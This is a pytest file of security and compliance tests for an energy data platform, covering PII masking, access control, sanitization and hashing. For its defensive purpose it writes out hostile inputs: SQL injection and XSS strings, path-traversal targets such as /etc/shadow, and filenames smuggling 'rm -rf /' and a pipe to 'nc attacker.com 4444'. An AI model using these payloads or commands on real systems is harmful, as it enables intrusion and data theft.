"""
Security and Compliance Tests for ONS Data Platform
Tests security controls, data protection, and compliance requirements
"""

import pytest
import json
import hashlib
import base64
import re
from unittest.mock import Mock, MagicMock, patch
import sys
import os
from datetime import datetime, timedelta

# Add source paths
sys.path.insert(0, 'src/rag_query_processor')
sys.path.insert(0, 'src/structured_data_processor')


class TestDataProtectionCompliance:
    """Test data protection and privacy compliance"""
    
    def test_pii_detection_and_masking(self):
        """Test PII detection and masking in data processing"""
        import pandas as pd
        from src.structured_data_processor.lambda_function import StructuredDataProcessor
        
        processor = StructuredDataProcessor()
        
        # Data with potential PII
        pii_data = pd.DataFrame({
            'timestamp': ['2024-01-01 10:00', '2024-01-01 11:00'],
            'region': ['São Paulo', 'Rio de Janeiro'],
            'operator_name': ['João Silva', 'Maria Santos'],  # PII
            'operator_email': ['joao@example.com', 'maria@example.com'],  # PII
            'operator_phone': ['+55-11-99999-9999', '+55-21-88888-8888'],  # PII
            'energy_value': [1000.0, 1100.0],
            'notes': ['Normal operation by João', 'Maintenance by Maria']  # Contains PII
        })
        
        # Should detect and handle PII appropriately
        cleaned_data = processor._clean_and_validate_data(pii_data, 'pii_test.csv')
        
        # Verify PII columns are handled
        sensitive_columns = ['operator_name', 'operator_email', 'operator_phone']
        for col in sensitive_columns:
            if col in cleaned_data.columns:
                # PII should be masked or removed
                for value in cleaned_data[col].dropna():
                    assert not any(char.isalpha() for char in str(value)) or '*' in str(value)
    
    def test_data_encryption_validation(self):
        """Test data encryption validation"""
        # Simulate encrypted data validation
        test_data = "sensitive energy data"
        
        # Simulate encryption
        encrypted_data = base64.b64encode(test_data.encode()).decode()
        
        # Validate encryption
        assert encrypted_data != test_data
        assert len(encrypted_data) > len(test_data)
        
        # Simulate decryption validation
        decrypted_data = base64.b64decode(encrypted_data.encode()).decode()
        assert decrypted_data == test_data
    
    def test_access_control_validation(self):
        """Test access control mechanisms"""
        # Simulate role-based access control
        user_roles = {
            'admin': {
                'permissions': ['read', 'write', 'delete', 'admin'],
                'data_access': ['all']
            },
            'analyst': {
                'permissions': ['read'],
                'data_access': ['generation', 'consumption']
            },
            'viewer': {
                'permissions': ['read'],
                'data_access': ['public_reports']
            }
        }
        
        protected_resources = [
            {'name': 'generation_data', 'classification': 'internal'},
            {'name': 'consumption_data', 'classification': 'internal'},
            {'name': 'transmission_data', 'classification': 'restricted'},
            {'name': 'public_reports', 'classification': 'public'}
        ]
        
        def check_access(user_role, resource_name, operation):
            role_config = user_roles.get(user_role, {})
            
            # Check operation permission
            if operation not in role_config.get('permissions', []):
                return False
            
            # Check data access
            resource = next((r for r in protected_resources if r['name'] == resource_name), None)
            if not resource:
                return False
            
            data_access = role_config.get('data_access', [])
            if 'all' in data_access:
                return True
            
            if resource['classification'] == 'public':
                return True
            elif resource['classification'] == 'internal':
                return resource_name in data_access or any(access in resource_name for access in data_access)
            elif resource['classification'] == 'restricted':
                return 'all' in data_access
            
            return False
        
        # Test access control scenarios
        assert check_access('admin', 'generation_data', 'read') is True
        assert check_access('admin', 'transmission_data', 'write') is True
        assert check_access('analyst', 'generation_data', 'read') is True
        assert check_access('analyst', 'transmission_data', 'read') is False
        assert check_access('viewer', 'public_reports', 'read') is True
        assert check_access('viewer', 'generation_data', 'read') is False
    
    def test_audit_logging_compliance(self):
        """Test audit logging for compliance"""
        audit_events = []
        
        def log_audit_event(user_id, action, resource, timestamp, result):
            audit_events.append({
                'user_id': user_id,
                'action': action,
                'resource': resource,
                'timestamp': timestamp,
                'result': result,
                'ip_address': '192.168.1.100',
                'user_agent': 'ONS-DataPlatform/1.0'
            })
        
        # Simulate various operations
        operations = [
            ('user123', 'read', 'generation_data', datetime.utcnow(), 'success'),
            ('user456', 'write', 'consumption_data', datetime.utcnow(), 'success'),
            ('user789', 'delete', 'transmission_data', datetime.utcnow(), 'denied'),
            ('user123', 'export', 'generation_data', datetime.utcnow(), 'success')
        ]
        
        for op in operations:
            log_audit_event(*op)
        
        # Verify audit logging
        assert len(audit_events) == 4
        
        # Check required audit fields
        required_fields = ['user_id', 'action', 'resource', 'timestamp', 'result']
        for event in audit_events:
            for field in required_fields:
                assert field in event
                assert event[field] is not None
        
        # Check for security events
        security_events = [e for e in audit_events if e['result'] == 'denied']
        assert len(security_events) == 1
        assert security_events[0]['action'] == 'delete'


class TestInputValidationSecurity:
    """Test input validation and sanitization security"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        from src.rag_query_processor.lambda_function import QueryProcessor
        
        processor = QueryProcessor()
        
        # SQL injection attempts
        malicious_queries = [
            "What is energy data'; DROP TABLE users; --",
            "Show me data' UNION SELECT * FROM sensitive_table --",
            "Energy info' OR '1'='1",
            "Data'; INSERT INTO logs VALUES ('hacked'); --"
        ]
        
        for query in malicious_queries:
            result = processor.preprocess_query(query)
            
            # Should sanitize malicious SQL
            assert 'DROP TABLE' not in result['processed_query']
            assert 'UNION SELECT' not in result['processed_query']
            assert "OR '1'='1" not in result['processed_query']
            assert 'INSERT INTO' not in result['processed_query']
    
    def test_xss_prevention(self):
        """Test XSS prevention in query processing"""
        from src.rag_query_processor.lambda_function import QueryProcessor
        
        processor = QueryProcessor()
        
        # XSS attempts
        xss_queries = [
            '<script>alert("xss")</script>What is energy data?',
            'Energy data<img src=x onerror=alert("xss")>',
            'Show me <iframe src="javascript:alert(\'xss\')"></iframe> data',
            'Data info<svg onload=alert("xss")></svg>'
        ]
        
        for query in xss_queries:
            result = processor.preprocess_query(query)
            
            # Should sanitize XSS attempts
            assert '<script>' not in result['processed_query']
            assert '<img' not in result['processed_query']
            assert '<iframe' not in result['processed_query']
            assert '<svg' not in result['processed_query']
            assert 'javascript:' not in result['processed_query']
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        # Simulate file processing with potential command injection
        malicious_filenames = [
            'data.csv; rm -rf /',
            'report.pdf && cat /etc/passwd',
            'file.xlsx | nc attacker.com 4444',
            'data.csv`whoami`'
        ]
        
        def sanitize_filename(filename):
            # Remove dangerous characters and commands
            sanitized = re.sub(r'[;&|`$(){}[\]<>]', '', filename)
            sanitized = re.sub(r'\s*(rm|cat|nc|whoami|curl|wget)\s*', '', sanitized, flags=re.IGNORECASE)
            return sanitized
        
        for filename in malicious_filenames:
            sanitized = sanitize_filename(filename)
            
            # Should remove malicious commands
            assert '; rm -rf' not in sanitized
            assert '&& cat' not in sanitized
            assert '| nc' not in sanitized
            assert '`whoami`' not in sanitized
    
    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        # Path traversal attempts
        malicious_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'  # URL encoded
        ]
        
        def sanitize_path(path):
            # Remove path traversal attempts
            sanitized = path.replace('..', '')
            sanitized = sanitized.replace('\\', '')
            sanitized = re.sub(r'%2e|%2f', '', sanitized, flags=re.IGNORECASE)
            
            # Ensure path is within allowed directories
            allowed_prefixes = ['data/', 'reports/', 'processed/']
            if not any(sanitized.startswith(prefix) for prefix in allowed_prefixes):
                sanitized = 'data/' + sanitized.lstrip('/')
            
            return sanitized
        
        for path in malicious_paths:
            sanitized = sanitize_path(path)
            
            # Should prevent path traversal
            assert '..' not in sanitized
            assert '/etc/' not in sanitized
            assert 'system32' not in sanitized
            assert sanitized.startswith(('data/', 'reports/', 'processed/'))


class TestCryptographicSecurity:
    """Test cryptographic security implementations"""
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        import secrets
        
        # Generate secure random values
        random_values = []
        for _ in range(100):
            random_values.append(secrets.randbelow(1000000))
        
        # Verify randomness properties
        assert len(set(random_values)) > 90  # Should have high uniqueness
        assert min(random_values) >= 0
        assert max(random_values) < 1000000
        
        # Test secure token generation
        tokens = []
        for _ in range(50):
            tokens.append(secrets.token_urlsafe(32))
        
        # Verify token properties
        assert len(set(tokens)) == 50  # All tokens should be unique
        assert all(len(token) >= 40 for token in tokens)  # Adequate length
    
    def test_password_hashing_security(self):
        """Test secure password hashing"""
        import hashlib
        import secrets
        
        def secure_hash_password(password, salt=None):
            if salt is None:
                salt = secrets.token_hex(16)
            
            # Use PBKDF2 with SHA-256
            hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
            return salt + hashed.hex()
        
        def verify_password(password, stored_hash):
            salt = stored_hash[:32]  # First 32 chars are salt
            stored_password_hash = stored_hash[32:]
            
            # Hash the provided password with the stored salt
            hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
            return hashed.hex() == stored_password_hash
        
        # Test password hashing
        test_password = "SecurePassword123!"
        hashed_password = secure_hash_password(test_password)
        
        # Verify hash properties
        assert len(hashed_password) > 64  # Salt + hash length
        assert hashed_password != test_password
        
        # Verify password verification
        assert verify_password(test_password, hashed_password) is True
        assert verify_password("WrongPassword", hashed_password) is False
    
    def test_data_integrity_verification(self):
        """Test data integrity verification"""
        import hashlib
        import hmac
        
        def calculate_checksum(data):
            return hashlib.sha256(data.encode()).hexdigest()
        
        def calculate_hmac(data, key):
            return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()
        
        # Test data integrity
        original_data = "Important energy data that must not be tampered with"
        checksum = calculate_checksum(original_data)
        
        # Verify integrity
        assert calculate_checksum(original_data) == checksum
        
        # Test tampering detection
        tampered_data = original_data + " TAMPERED"
        assert calculate_checksum(tampered_data) != checksum
        
        # Test HMAC for authenticated integrity
        secret_key = "secret_integrity_key"
        hmac_value = calculate_hmac(original_data, secret_key)
        
        # Verify HMAC
        assert calculate_hmac(original_data, secret_key) == hmac_value
        assert calculate_hmac(tampered_data, secret_key) != hmac_value


class TestSecurityHeaders:
    """Test security headers and configurations"""
    
    def test_api_security_headers(self):
        """Test API security headers"""
        from src.rag_query_processor.lambda_function import lambda_handler as rag_handler
        
        event = {
            'httpMethod': 'GET',
            'path': '/health'
        }
        
        with patch.dict(os.environ, {'KNOWLEDGE_BASE_ID': 'test-kb-id'}):
            response = rag_handler(event, None)
            
            # Check security headers
            headers = response.get('headers', {})
            
            # CORS headers
            assert 'Access-Control-Allow-Origin' in headers
            assert 'Access-Control-Allow-Methods' in headers
            assert 'Access-Control-Allow-Headers' in headers
            
            # Security headers (should be added in production)
            expected_security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            # Note: These might not be present in current implementation
            # but should be added for production security
            for header in expected_security_headers:
                if header in headers:
                    assert headers[header] is not None
    
    def test_content_type_validation(self):
        """Test content type validation"""
        from src.rag_query_processor.lambda_function import lambda_handler as rag_handler
        
        # Test with valid content type
        valid_event = {
            'httpMethod': 'POST',
            'path': '/query',
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps({'question': 'Test query'})
        }
        
        with patch.dict(os.environ, {'KNOWLEDGE_BASE_ID': 'test-kb-id'}):
            with patch('src.rag_query_processor.lambda_function.bedrock_runtime') as mock_bedrock:
                mock_bedrock.retrieve_and_generate.return_value = {
                    'output': {'text': 'Test response'},
                    'citations': []
                }
                
                response = rag_handler(valid_event, None)
                assert response['statusCode'] == 200
        
        # Test with potentially malicious content type
        malicious_event = {
            'httpMethod': 'POST',
            'path': '/query',
            'headers': {'Content-Type': 'application/json; charset=utf-8; boundary=--malicious'},
            'body': json.dumps({'question': 'Test query'})
        }
        
        with patch.dict(os.environ, {'KNOWLEDGE_BASE_ID': 'test-kb-id'}):
            # Should handle gracefully
            response = rag_handler(malicious_event, None)
            # Response should not expose internal errors
            assert response['statusCode'] in [200, 400, 500]


class TestComplianceReporting:
    """Test compliance reporting and monitoring"""
    
    def test_gdpr_compliance_simulation(self):
        """Test GDPR compliance simulation"""
        # Simulate GDPR compliance requirements
        gdpr_requirements = {
            'data_minimization': True,
            'purpose_limitation': True,
            'storage_limitation': True,
            'accuracy': True,
            'security': True,
            'accountability': True
        }
        
        # Simulate data processing compliance check
        data_processing_activities = [
            {
                'purpose': 'energy_analysis',
                'data_types': ['energy_consumption', 'generation_data'],
                'retention_period': '7_years',
                'legal_basis': 'legitimate_interest',
                'security_measures': ['encryption', 'access_control', 'audit_logging']
            },
            {
                'purpose': 'system_monitoring',
                'data_types': ['system_logs', 'performance_metrics'],
                'retention_period': '1_year',
                'legal_basis': 'legitimate_interest',
                'security_measures': ['encryption', 'access_control']
            }
        ]
        
        def check_gdpr_compliance(activity):
            compliance_score = 0
            
            # Check data minimization
            if len(activity['data_types']) <= 5:  # Reasonable limit
                compliance_score += 1
            
            # Check purpose limitation
            if activity['purpose'] in ['energy_analysis', 'system_monitoring', 'regulatory_reporting']:
                compliance_score += 1
            
            # Check storage limitation
            if activity['retention_period'] in ['1_year', '7_years', '10_years']:
                compliance_score += 1
            
            # Check security measures
            required_security = ['encryption', 'access_control']
            if all(measure in activity['security_measures'] for measure in required_security):
                compliance_score += 1
            
            return compliance_score / 4  # Normalize to 0-1
        
        # Check compliance for all activities
        compliance_scores = []
        for activity in data_processing_activities:
            score = check_gdpr_compliance(activity)
            compliance_scores.append(score)
        
        # Verify compliance
        average_compliance = sum(compliance_scores) / len(compliance_scores)
        assert average_compliance >= 0.8  # 80% compliance minimum
        assert all(score >= 0.5 for score in compliance_scores)  # No activity below 50%
    
    def test_security_incident_reporting(self):
        """Test security incident reporting"""
        security_incidents = []
        
        def report_security_incident(incident_type, severity, description, affected_systems):
            incident = {
                'id': f"INC-{len(security_incidents) + 1:04d}",
                'type': incident_type,
                'severity': severity,
                'description': description,
                'affected_systems': affected_systems,
                'reported_at': datetime.utcnow().isoformat(),
                'status': 'open',
                'response_actions': []
            }
            security_incidents.append(incident)
            return incident['id']
        
        # Simulate various security incidents
        incident_scenarios = [
            ('unauthorized_access', 'high', 'Failed login attempts detected', ['api_gateway']),
            ('data_breach_attempt', 'critical', 'Suspicious data access patterns', ['s3_buckets', 'database']),
            ('malware_detection', 'medium', 'Suspicious file uploaded', ['file_processing']),
            ('ddos_attack', 'high', 'Unusual traffic patterns detected', ['api_gateway', 'load_balancer'])
        ]
        
        for scenario in incident_scenarios:
            incident_id = report_security_incident(*scenario)
            assert incident_id.startswith('INC-')
        
        # Verify incident reporting
        assert len(security_incidents) == 4
        
        # Check incident severity distribution
        critical_incidents = [i for i in security_incidents if i['severity'] == 'critical']
        high_incidents = [i for i in security_incidents if i['severity'] == 'high']
        
        assert len(critical_incidents) == 1
        assert len(high_incidents) == 2
        
        # Verify all incidents have required fields
        required_fields = ['id', 'type', 'severity', 'description', 'reported_at', 'status']
        for incident in security_incidents:
            for field in required_fields:
                assert field in incident
                assert incident[field] is not None


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])